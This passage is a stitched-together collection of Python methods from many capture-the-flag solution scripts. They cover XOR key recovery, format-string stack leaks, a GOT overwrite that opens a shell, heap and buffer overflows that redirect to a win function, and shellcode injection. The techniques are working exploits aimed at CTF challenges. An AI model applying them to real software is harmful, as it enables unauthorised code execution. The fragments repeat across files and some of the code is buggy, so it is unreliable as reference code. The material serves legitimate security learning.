            print(f&#34;[*] Reverse engineering with key length: {key_len}&#34;)

            # Calculate what the stage1 result should start with
            stage1_prefix = []
            for i in range(min(len(target_prefix), len(encrypted_stage2))):
                stage1_prefix.append(encrypted_stage2[i] ^ target_prefix[i])

            stage1_prefix_bytes = bytes(stage1_prefix)
            print(f&#34;[*] Stage1 result should start with: {stage1_prefix_bytes.hex()}&#34;)

            # Now try to find what key produces this stage1_prefix
            key_candidate = []

            for i in range(min(len(stage1_prefix_bytes), len(encrypted_stage1))):
                key_byte = encrypted_stage1[i] ^ stage1_prefix_bytes[i]
                key_candidate.append(key_byte)

            if len(key_candidate) &gt;= 5:
                # Extend key to full length by repeating pattern
                full_key = (key_candidate * ((key_len // len(key_candidate)) + 1))[
                    :key_len
                ]
                test_key = bytes(full_key)

                print(f&#34;[*] Testing key candidate: {test_key}&#34;)

                # Test this key
                stage1_result = self.xor_decrypt(encrypted_stage1, test_key)
                final_result = self.xor_decrypt(encrypted_stage2, stage1_result)

                print(f&#34;[*] Result: {final_result}&#34;)

                # Check if it looks like a valid flag
                if b&#34;ECSC{&#34; in final_result or b&#34;ecsc{&#34; in final_result:
                    print(f&#34;[+] FOUND KEY: {test_key}&#34;)
                    print(f&#34;[+] FLAG: {final_result}&#34;)
                    return test_key, final_result

        print(&#34;[-] Could not find the key automatically&#34;)
        return None, None

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def main(self):
        print(&#34;=&#34; * 60)
        print(&#34;Key Recovery Script for &#39;Just a Key&#39; Challenge - ECSC Format&#34;)
        print(&#34;=&#34; * 60)
        key, flag = self.solve_challenge()

        if key:
            print(f&#34;\n[SUCCESS] Key found: {key}&#34;)
            print(f&#34;[SUCCESS] Flag: {flag}&#34;)
        else:
            print(&#34;\n[FAILED] Could not automatically recover the key&#34;)
            print(
                &#34;You may need to analyze the binary further or try manual key recovery&#34;
            )

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def xor_decrypt(self, key_bytes: bytes, input_bytes: bytes) -&gt; bytes:
        key_len = len(input_bytes)
        result = bytearray(key_len)
        for i in range(key_len):
            result[i] = input_bytes[i % len(input_bytes)] ^ key_bytes[i]
        return result

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def mutate_key(self, buf: bytearray, key: bytes) -&gt; bytearray:
        tmp = buf[:]
        for i in range(0, len(key), 5):
            chunk = key[i : i + 5]
            tmp = self.xor_decrypt(tmp, chunk)
        return tmp

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def try_key(self, candidate: str):
        key = candidate.encode()
        if len(key) &lt; 5:
            return None

        # Transform key_step1 using input
        transformed_key = self.mutate_key(self.key_step1, key)
        # First decryption stage
        intermediate = self.xor_decrypt(self.encrypted_intermediate, transformed_key)
        # Final decryption
        flag = self.xor_decrypt(self.encrypted_flag, intermediate)
        return flag

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def bruteforcer(self):

        print(&#34;[*] Brute-forcing keys with known prefix:&#34;, self.known_prefix)

        for length in range(5, 30):  # keep short for demonstration
            for suffix in product(self.charset, repeat=length - len(self.known_prefix)):
                candidate_key = self.known_prefix + &#34;&#34;.join(suffix)
                result = self.try_key(candidate_key)
                print(candidate_key, result)
                if (
                    result
                    and result.startswith(self.flag_prefix)
                    and result[-1] == ord(&#34;}&#34;)
                ):
                    print(&#34;[+] Found key:&#34;, candidate_key)
                    print(&#34;[+] Flag:&#34;, result.decode(errors=&#34;ignore&#34;))
                    return

        print(&#34;[-] No valid flag found.&#34;)

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def smarter_bruteforcer(self):
        &#34;&#34;&#34;
        Check the first letter first, and then continue
        &#34;&#34;&#34;
        dummy = &#34;a&#34; * 5  # dummy suffix for length calculation
        for length in range(5, 30):  # keep short for demonstration
            pass

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def main(self):

        step1_key = [
            0x11,
            0x11,
            0x11,
            0x11,
            0x11,
            0x01,
            0x3D,
            0x46,
            0x8F,
            0x9E,
            0xBA,
            0xE9,
            0x59,
            0x4F,
            0xFF,
            0xCF,
            0x56,
            0xEA,
            0xC9,
            0x94,
            0x5B,
            0x05,
            0x3E,
            0x68,
            0x7F,
            0x38,
            0x9B,
            0x12,
            0xC1,
            0x7A,
            0xE0,
            0xD7,
            0x81,
            0xE5,
            0x94,
            0x9D,
            0xC1,
            0xE4,
            0x57,
            0x2E,
            0x2D,
            0x00,
        ]

        self.key_step1 = bytearray.fromhex(
            &#34;11111111&#34;
            &#34;11&#34;
            &#34;00&#34;
            &#34;59e9ba9e8f463d01&#34;
            &#34;5b94c9ea56cfff4f&#34;
            &#34;0c1129b387f683e5&#34;
            &#34;c19d94e581d7e07a&#34;
            &#34;2d2e57e4&#34;
            &#34;00&#34;
        ).ljust(44, b&#34;\x00&#34;)

        # From local_258 onward
        self.encrypted_intermediate = bytearray.fromhex(
            &#34;59e9ba9e8f463d01&#34;
            &#34;5b94c9ea56cfff4f&#34;
            &#34;0c1129b387f683e5&#34;
            &#34;c19d94e581d7e07a&#34;
            &#34;2d2e57e4&#34;
        )

        # From local_228 onward
        self.encrypted_flag = bytearray.fromhex(
            &#34;4e9ef0d5ea375c64&#34;
            &#34;48e7dea62bdb901d&#34;
            &#34;5a4654dee5b1d698&#34;
            &#34;8d8e95f2979d8315&#34;
            &#34;703f1481&#34;
        )

        # Charset for brute-forcing
        self.charset = string.ascii_letters + string.digits + &#34;_{}&#34;
        self.known_prefix = &#34;&#34;
        self.flag_prefix = b&#34;ECSC{&#34;

        self.bruteforcer()

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_3/payloads/solution.py
    def __init__(self, **kwargs) -&gt; None:
        super().__init__(**kwargs)
        self.prepare_space(
            files=[&#34;flag.txt&#34;], folder=self.folder_files, test_text=&#34;picoCTF{test}&#34;
        )
        # self.elf = self.pwn.ELF(self.challenge_file)
        self.initiate_connection()

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_3/payloads/solution.py
    def main(self):
        self.menu_num = 8
        self.menu_text = &#34;Enter your choice: &#34;

        # Init
        self.recv_menu(4)

        self.send_menu(&#34;5&#34;)
        self.send_menu(&#34;2&#34;)

        self.conn.recvuntil(b&#34;allocation: &#34;)
        self.conn.sendline(b&#34;31&#34;)
        self.conn.recvuntil(b&#34;Data for flag: &#34;)
        self.conn.sendline(b&#34;A&#34; * 30 + b&#34;pico&#34;)

        self.send_menu(&#34;3&#34;)
        self.recv_menu(4, False)

        self.send_menu(&#34;4&#34;)

        self.recv_menu(2, True)

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def __init__(self, **kwargs) -&gt; None:
        super().__init__(**kwargs)
        self.prepare_space(
            files=[&#34;flag.txt&#34;], folder=self.folder_files, test_text=&#34;picoCTF{test}&#34;
        )
        self.current_initiate_connection()

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def initiate_connection(self):
        # return super().initiate_connection()
        pass

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def current_initiate_connection(self):
        self.connect(self.conn_type)

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def main(self):

        # Welcome message
        for _ in range(5):
            out = self.conn.recvline()
            # print(out)

        # Menu
        for _ in range(8):
            out = self.conn.recvline()
            # print(out)

        # Options
        for _ in range(7):
            out = self.conn.recvline()
            # print(out)

        out = self.conn.recvuntil(b&#34;Enter your choice: &#34;)
        # print(out)

        payload = b&#34;A&#34; * 32 + b&#34;pico&#34;

        self.conn.sendline(b&#34;2&#34;)

        self.conn.sendline(payload)

        print(self.conn.recvuntil(b&#34;choice: &#34;))

        self.conn.sendline(b&#34;4&#34;)

        print(self.conn.recvline())
        print(self.conn.recvline())
        print(self.conn.recvline())
        print(self.conn.recvline())

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def exploitation(self):
        self.initiate_connection()
        self.recv_menu(4)
        self.conn.sendline(b&#34;1&#34;)
        self.conn.recvuntil(b&#34;What is your API token?\n&#34;)
        self.conn.sendline(b&#34;%p&#34; * 24)
        self.conn.recvline()
        data = self.conn.recvline().strip().decode()
        return data

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def to_hex(self, data):
        if type(data) == str:
            return &#34;&#34;.join([hex(ord(c)) for c in data])
        return &#34;&#34;.join([hex(ord(c))[2:] for c in data])

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def from_hex(self, data):
        return &#34;&#34;.join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def data_processing(self, data):

        output = &#34;&#34;.join(data.split(&#34;(nil)&#34;))

        output = output.strip(&#34;0x&#34;).split(&#34;0x&#34;)
        temp = []

        for item in output:
            temp_word = &#34;&#34;
            if len(item) == 8:
                for i in range(0, 8, 2):
                    temp_word = item[i : i + 2] + temp_word
                temp_word = self.from_hex(temp_word)
                temp.append(temp_word)
            else:

                temp.append(self.from_hex(item))

        output = temp
        output = &#34;&#34;.join(output)
        return output

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def local_run(self):
        data = &#34;0x9cc74100x804b0000x80489c30xf7ec6d800xffffffff0x10x9cc51600xf7ed41100xf7ec6dc7(nil)0x9cc61800x10x9cc73f00x9cc74100x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x633432610x366134310xff87007d&#34;
        return data

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def main(self):
        self.menu_num = 4
        data = self.exploitation()
        data = self.data_processing(data)
        flag = self.re_match_flag(data, &#34;picoCTF&#34;)[0]
        print(flag)

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def exploitation(self):

        self.conn = self.pwn.remote(self.url, self.port)

        for _ in range(4):
            self.conn.recvline()

        self.conn.sendline(b&#34;1&#34;)

        question = &#34;What is your API token?\n&#34;
        payload = &#34;%p&#34; * 24

        self.conn.recvuntil(question.encode())
        self.conn.sendline(payload.encode())
        self.conn.recvline()
        data = self.conn.recvline().strip().decode()
        return data

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def to_hex(self, data):
        if type(data) == str:
            return &#34;&#34;.join([hex(ord(c)) for c in data])
        return &#34;&#34;.join([hex(ord(c))[2:] for c in data])

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def from_hex(self, data):
        return &#34;&#34;.join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def data_processing(self, data):

        output = &#34;&#34;.join(data.split(&#34;(nil)&#34;))

        output = output.strip(&#34;0x&#34;).split(&#34;0x&#34;)
        temp = []

        for item in output:
            temp_word = &#34;&#34;
            if len(item) == 8:
                for i in range(0, 8, 2):
                    temp_word = item[i : i + 2] + temp_word
                temp_word = self.from_hex(temp_word)
                temp.append(temp_word)
            else:

                temp.append(self.from_hex(item))

        output = temp
        output = &#34;&#34;.join(output)
        return output

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def re_match_flag(self, text: str, origin: str) -&gt; list[str]:
        &#34;&#34;&#34;
        Description:
        Find the flag in the text

        Args:
            text (str): Text to search for the flag
            origin (str): Origin of the flag

        Returns:
            str: list of flag found in the text
        &#34;&#34;&#34;
        flag_pattern = rf&#34;{origin}{{[A-Za-z0-9_]+}}&#34;
        return re.findall(flag_pattern, text)

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def main(self):
        self.menu_num = 4
        data = self.exploitation()
        data = self.data_processing(data)
        flag = self.re_match_flag(data, &#34;picoCTF&#34;)[0]
        print(flag)

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def exploitation(self):
        self.initiate_connection()
        self.recv_menu(4)
        self.conn.sendline(b&#34;1&#34;)
        self.conn.recvuntil(b&#34;What is your API token?\n&#34;)
        self.conn.sendline(b&#34;%p&#34; * 24)
        self.conn.recvline()
        data = self.conn.recvline().strip().decode()
        return data

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def to_hex(self, data):
        if type(data) == str:
            return &#34;&#34;.join([hex(ord(c)) for c in data])
        return &#34;&#34;.join([hex(ord(c))[2:] for c in data])

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def from_hex(self, data):
        return &#34;&#34;.join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def data_processing(self, data):

        output = &#34;&#34;.join(data.split(&#34;(nil)&#34;))

        output = output.strip(&#34;0x&#34;).split(&#34;0x&#34;)
        temp = []

        for item in output:
            temp_word = &#34;&#34;
            if len(item) == 8:
                for i in range(0, 8, 2):
                    temp_word = item[i : i + 2] + temp_word
                temp_word = self.from_hex(temp_word)
                temp.append(temp_word)
            else:

                temp.append(self.from_hex(item))

        output = temp
        output = &#34;&#34;.join(output)
        return output

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def local_run(self):
        data = &#34;0x9cc74100x804b0000x80489c30xf7ec6d800xffffffff0x10x9cc51600xf7ed41100xf7ec6dc7(nil)0x9cc61800x10x9cc73f00x9cc74100x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x633432610x366134310xff87007d&#34;
        return data

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def main(self):
        self.menu_num = 4
        data = self.exploitation()
        data = self.data_processing(data)
        flag = self.re_match_flag(data, &#34;picoCTF&#34;)[0]
        print(flag)

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_2/payloads/solution.py
    def __init__(self, *args, **kwargs) -&gt; None:
        super().__init__(*args, **kwargs)
        self.prepare_space()
        # self.pwn.context.log_level = &#34;critical&#34;
        self.pwn.context.binary = self.pwn.ELF(Path(self.folder_files, self.file))
        self.initiate_connection()

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_2/payloads/solution.py
    def exec_fmt(self, payload):
        p = CTFSolver(conn=self.conn_type, file=self.file, url=self.url, port=self.port)
        p.initiate_connection()
        p.conn.sendline(payload)
        return p.conn.recvall()

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_2/payloads/solution.py
    def main(self):
        print(self.conn.recvline())

        # This uses the exec_fmt, autofmt in the documentation to find the offset for the payload.
        # To find the address objump -D vuln was used on the binary executable file.
        # When searching for the function &#34;sus&#34; these lines could be seen.z

        autofmt = self.pwn.FmtStr(self.exec_fmt)
        offset = autofmt.offset
        print(f&#34;Offset: {offset}&#34;)

        payload = self.pwn.fmtstr_payload(offset, {0x404060: 0x67616C66})
        self.conn.sendline(payload)

        print(self.conn.recvall())

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_3/payloads/solution.py
    def __init__(self, *args, **kwargs) -&gt; None:
        super().__init__(*args, **kwargs)

        self.prepare_space(files=[&#34;flag.txt&#34;], folder=self.folder_files)

        self.pwn.context.binary = self.binary = self.pwn.ELF(
            self.challenge_file, checksec=True
        )

        self.library = Path(self.folder_files, &#34;libc.so.6&#34;)

        self.libc = self.pwn.ELF(self.library, checksec=False)

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_3/payloads/solution.py
    def exec_func(self, payload):
        p = Solution(conn=&#34;local&#34;, file=self.file)
        p.initiate_connection()
        p.conn.sendline(payload)
        p.conn.recvline()
        p.conn.recvline()
        res = p.conn.recvline()
        print(res)
        return res.strip()

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_3/payloads/solution.py
    def main(self):

        fmtstr = self.pwn.FmtStr(self.exec_func)
        super().initiate_connection()
        self.conn.recvuntil(&#34;libc: &#34;)
        setvbuf = int(self.conn.recvline().strip().decode(), 16)

        self.libc.address = setvbuf - 0x7A3F0

        payload = b&#34;A&#34; * fmtstr.padlen + self.pwn.fmtstr_payload(
            fmtstr.offset, {self.binary.got.puts: self.libc.symbols.system}
        )

        self.conn.sendline(payload)

        self.conn.interactive()

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_0/payloads/solution.py
    def main(self):
        for _ in range(20):
            # print(self.conn.recvline())
            self.conn.recvline()

        print(self.conn.recvuntil(b&#34;Enter your choice: &#34;))

        self.conn.sendline(b&#34;2&#34;)

        print(self.conn.recvuntil(b&#34;Data for buffer: &#34;))

        payload = &#34;A&#34; * 32
        print(payload)

        self.conn.sendline(payload)

        for _ in range(7):
            # print(self.conn.recvline())
            self.conn.recvline()

        print(self.conn.recvuntil(b&#34;Enter your choice: &#34;))

        # # To check it
        # self.conn.sendline(b&#34;3&#34;)

        # print(self.conn.recvuntil(b&#34;Enter your choice: &#34;))

        # # To check it
        # self.conn.sendline(b&#34;1&#34;)

        # print(self.conn.recvuntil(b&#34;Enter your choice: &#34;))

        self.conn.sendline(b&#34;4&#34;)

        print(self.conn.recvall())

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_1/payloads/solution.py
    def __init__(self, **kwargs) -&gt; None:
        self.get_parent()
        self.prepare_space()
        super().__init__(**kwargs)

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_1/payloads/solution.py
    def prepare_space(self):
        files = [
            &#34;secret-menu-item-1.txt&#34;,
            &#34;secret-menu-item-2.txt&#34;,
            &#34;flag.txt&#34;,
        ]
        for file in files:
            with open(Path(self.folder_payloads, file), &#34;w&#34;) as f:
                f.write(&#34;picoCTF{test}&#34;)

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_1/payloads/solution.py
    def main(self):
        # print(self.file)
        print(self.conn.recvline())
        self.conn.sendline(
            b&#34;%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p&#34;
        )
        print(self.conn.recvline())
        print(self.conn.recvline())

        # /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def generate_pattern(self, length=1, n=8):
        &#34;&#34;&#34;
        Generates a cyclic pattern of a given length.

        Args:
            length (int): The length of the pattern to generate.
            n (int): The number of unique characters in the pattern.

        Returns:
            str: The generated cyclic pattern.
        &#34;&#34;&#34;
        return self.pwn.cyclic(length=length, n=n)

        # /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def find_offset(self, pattern, n=8):
        &#34;&#34;&#34;
        Finds the offset of a given pattern in the cyclic pattern.

        Args:
            pattern (str): The pattern to find the offset for.
            n (int): The number of unique characters in the pattern.

        Returns:
            int: The offset of the pattern.
        &#34;&#34;&#34;
        return self.pwn.cyclic_find(pattern, n=n)

        # /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def main(self):
        offset = self.local_exploitation()

        # Here is a slight problem that the offset is different than the one that gef gives
        payload = b&#34;A&#34; * offset + b&#34;\xef\xbe\xad\xde&#34;

        self.remote_exploitation(payload)

        # /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def local_exploitation(self):
        &#34;&#34;&#34;
        Performs local exploitation to find the offset.

        Returns:
            int: The offset found from the local exploitation.
        &#34;&#34;&#34;
        local = CTFSolver(conn=&#34;local&#34;, file=self.file, url=self.url, port=self.port)
        local.initiate_connection()

        # Header
        local.recv_lines(number=19, display=False)
        # Two sentence message
        local.recv_lines(number=2, display=False)

        payload = self.generate_pattern(length=300)
        print(f&#34;Pattern: {payload}&#34;)

        # Sending payload
        local.send(payload, encode=False)

        output = local.recv_lines(number=2, save=True)

        rpb = str(output[0]).replace(&#34;\\n&#34;, &#34;&#34;).split(&#34;==&#34;)[1].strip().strip(&#34;&#39;&#34;)
        print(rpb)
        crash_value = int(rpb, 16)
        offset = self.find_offset(crash_value)
        print(f&#34;Offset: {offset}&#34;)
        return offset

        # /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def remote_exploitation(self, payload):
        &#34;&#34;&#34;
        Performs remote exploitation using the given payload.

        Args:
            payload (bytes): The payload to use for remote exploitation.
        &#34;&#34;&#34;
        remote = CTFSolver(conn=&#34;remote&#34;, file=self.file, url=self.url, port=self.port)
        remote.initiate_connection()

        # Header
        remote.recv_lines(number=19, display=False)
        # Two sentence message
        remote.recv_lines(number=2, display=True)

        # Sending payload
        remote.send(payload, encode=False)

        remote.recv_lines(number=3, display=True)

        # /home/figaro/CTF/Categories/Binary/picoCTF/basic-file-exploit/payloads/solution.py
    def main(self):
        self.initiate_connection()

        self.menu_text = &#34;&#34;
        self.menu_num = 4

        self.recv_lines(number=self.menu_num, display=True)
        self.send(&#34;1&#34;)
        self.recv_lines(number=2, display=True)
        self.send(&#34;1&#34;)
        self.recv_lines(number=2, display=True)
        self.send(&#34;1&#34;)
        self.recv_lines(number=3, display=True)
        self.send(&#34;2&#34;)
        self.recv_lines(number=2, display=True)
        self.send(&#34;0&#34;)
        self.recv_lines(number=2, display=True)

        # /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.menu_num = 0
        self.menu_text = &#34;Enter the address in hex to jump to, excluding &#39;0x&#39;: &#34;
        self.local_preparations()
        self.elf = self.pwn.ELF(self.challenge_file)
        self.initiate_connection()

        # /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def local_preparations(self):
        if self.conn == &#34;remote&#34;:
            return
        self.challenge_file = self.Path(self.parent, &#34;challenge&#34;, self.file)
        self.folder_challenge = self.Path(self.parent, &#34;challenge&#34;)
        self.prepare_space(
            files=[&#34;flag.txt&#34;],
            folder=self.folder_challenge,
        )

        # /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def get_address(self, function):
        address = self.elf.symbols[function]
        # process address
        return address

        # /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def main(self):

        win_address = self.get_address(&#34;win&#34;)

        payload = str(hex(win_address)).split(&#34;0x&#34;)[1]
        self.send_menu(choice=payload)

        flag = self.recv_menu(number=3, display=True, save=True)[2]
        flag = flag.decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).strip(&#34; &#34;)
        print(flag)

        # /home/figaro/CTF/Categories/Binary/picoCTF/filtered-shellcode/payloads/solution.py
    def load_shellcode(self):
        shellcode = &#34;&#34;
        exploit_filed = self.folfil(folder=&#34;payloads&#34;, file=&#34;exploit.asm&#34;)
        with open(exploit_filed, &#34;r&#34;) as f:
            shellcode = f.read()

        shellcode = self.pwn.asm(shellcode)
        print(shellcode)

        return shellcode

        # /home/figaro/CTF/Categories/Binary/picoCTF/filtered-shellcode/payloads/solution.py
    def main(self):

        self.menu_num = 0
        self.menu_text = &#34;Give me code to run:&#34;
        shellcode = self.load_shellcode()
        self.initiate_connection()
        self.recv_until(&#34;run:&#34;)
        # Note: fix send to be able to send text without encoding it
        # self.send(shellcode)
        self.conn.sendline(shellcode)
        self.conn.interactive()

        # /home/figaro/CTF/Categories/Binary/picoCTF/PIE_TIME/payloads/solution.py
    def get_elf_function_address(self, function):
        &#34;&#34;&#34;
        Description:
        &#34;&#34;&#34;
        if self.elf is None:
            self.elf = self.pwn.ELF(self.challenge_file)

        return self.elf.symbols[function]

        # /home/figaro/CTF/Categories/Binary/picoCTF/PIE_TIME/payloads/solution.py
    def challenge_get_offset_address(self):
        offset = self.get_elf_function_address(&#34;main&#34;) - self.get_elf_function_address(
            &#34;win&#34;
        )
        return offset

        # /home/figaro/CTF/Categories/Binary/picoCTF/PIE_TIME/payloads/solution.py
    def main(self):
        self.initiate_connection()
        self.elf = None
        main_function = self.recv_lines(1, display=False, save=True)[0]

        main_function = main_function.split(b&#34; &#34;)[-1].decode(&#34;utf-8&#34;).strip(&#34;\n&#34;)
        main_function = int(main_function, 16)

        win_addr = main_function - self.challenge_get_offset_address()

        menu_text = &#34;Enter the address to jump to, ex =&gt; 0x12345: &#34;
        self.recv_send(
            text=hex(win_addr), text_until=menu_text, save=True, display=True
        )

        result = self.recv_lines(3, display=True, save=True)[-1]

        flag = self.re_match_partial_flag(
            text=result.decode(&#34;utf-8&#34;), origin=&#34;picoCTF{&#34;
        )

        pyperclip.copy(flag[0])

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def __init__(self, **kwargs) -&gt; None:
        super().__init__(**kwargs)
        self.prepare_space(
            files=[&#34;flag.txt&#34;], folder=self.folder_files, test_text=&#34;picoCTF{test}&#34;
        )
        self.elf = self.pwn.ELF(self.challenge_file)
        self.initiate_connection()

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def get_address(self):
        # win = self.elf.symbols[&#34;win&#34;]
        # self.win_address = hex(win)
        self.win_address = self.elf.symbols[&#34;win&#34;]
        self.win_address = hex(self.win_address)

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def build_payload(self):
        self.payload = b&#34;A&#34; * 32
        self.get_address()
        length = len(hex(self.win_address)) - 2
        self.payload += self.pwn.p32(int(self.win_address, 16))
        self.payload += self.pwn.p32(self.win_address)
        # self.payload = self.payload[:-2]
        # self.payload += b&#34;\x40&#34;

        self.payload += struct.pack(&#34;&gt;I&#34;, self.win_address)
        self.payload = self.payload[:-2]
        self.payload += b&#34;\x40&#34;

        length = (16 - length) // 2
        for _ in range(length):
            self.payload += b&#34;\x00&#34;

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def main(self):

        # self.build_payload()

        # return

        # Welcome message
        for _ in range(2):
            out = self.conn.recvline()
            # print(out)

        # Menu
        for _ in range(7):
            out = self.conn.recvline()
            # print(out)

        out = self.conn.recvuntil(b&#34;Enter your choice: &#34;)
        # print(out)

        self.conn.sendline(b&#34;2&#34;)

        self.conn.recvuntil(b&#34;Data for buffer: &#34;)

        # self.payload = b&#34;A&#34; * 32 + b&#34;\xa0\x11\x40\x00\x00\x00\x00\x00&#34;
        self.payload = (
            b&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00&#34;
        )
        print(self.payload)
        self.conn.sendline(self.payload)
        print(self.conn.recvuntil(b&#34;choice: &#34;))

        # self.conn.sendline(b&#34;3&#34;)
        # print(self.conn.recvuntil(b&#34;choice: &#34;))
        self.conn.sendline(b&#34;4&#34;)
        print(self.conn.recvuntil(b&#34;choice: &#34;))

        # /home/figaro/CTF/Categories/Binary/ctflearn/Positive_Challenge/payloads/solution.py
    def main(self):
        self.initiate_connection()

        self.menu_num = 0
        self.menu_text = &#34;Enter a number to add: &#34;

        # self.send_menu(9999999999999999999999, display=True)
        # self.recv_lines(1, display=True)

        self.looper()

        # /home/figaro/CTF/Categories/Binary/ctflearn/Positive_Challenge/payloads/solution.py
    def looper(self):
        payload = &#34;-1-1-2-3-4-5-6-7-8-9-10-11-12-13-14-15-16-17-1813-14-15-16-17-18---1&#34;
        payload = &#34;-1-1-1111111111111--11111111111111&#34;

        times = 110
        for i in range(times):
            self.send_menu(payload)
            self.recv_lines(1, display=True)
        # self.recv_lines(10, display=True)
        # self.recv_lines(1, display=True)

        # # acc = self.recv_lines(1, save=True)[0]
        # # print(acc)

        # self.send_menu(&#34;1--1&#34;)

        self.recv_lines(times, display=True)

        # /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def main(self):
        self.prepare_space(
            files=[&#34;flag.txt&#34;], folder=self.folders[&#34;files&#34;], test_text=&#34;ctflean{test}&#34;
        )
        self.menu_text = &#34;What is your favorite format tag? &#34;
        self.menu_num = 0

        addresses = self.read_address_positions(11)
        flag = self.decode_address(addresses, 7, 11)

        # /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def read_address_positions(self, positions):
        &#34;&#34;&#34;
        Reads the address of the stack

        Args:
            positions (int): Number of positions to read

        Returns:
            list: List of addresses
        &#34;&#34;&#34;
        # How to read a specific address
        payload = &#34;%p &#34; * positions
        output = self.simple_payload_send(payload)
        address_all = output.decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).split(&#34; &#34;)

        return address_all

        # /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def decode_address(self, address_all, start=0, end=None):
        &#34;&#34;&#34;
        Description:
            Decodes the address of the stack

        Args:
            address_all (list): List of addresses
            start (int, optional): Starting position of the address. Defaults to 0.
            end ([type], optional): Ending position of the address. Defaults to None.

        Returns:
            bytes: Decoded text of the address
        &#34;&#34;&#34;
        decoded_text = b&#34;&#34;

        if end is None:
            end = len(address_all)

        for i in range(start, end):
            decoded_text += self.pwn.p64(int(address_all[i], 16))
        return decoded_text

        # /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def simple_payload_send(self, payload, lines=1):
        &#34;&#34;&#34;
        Description:
            Sends a simple payload to the connection

        Args:
            payload (str): Payload to send
            lines (int, optional): Number of lines to receive. Defaults to 1.

        Returns:
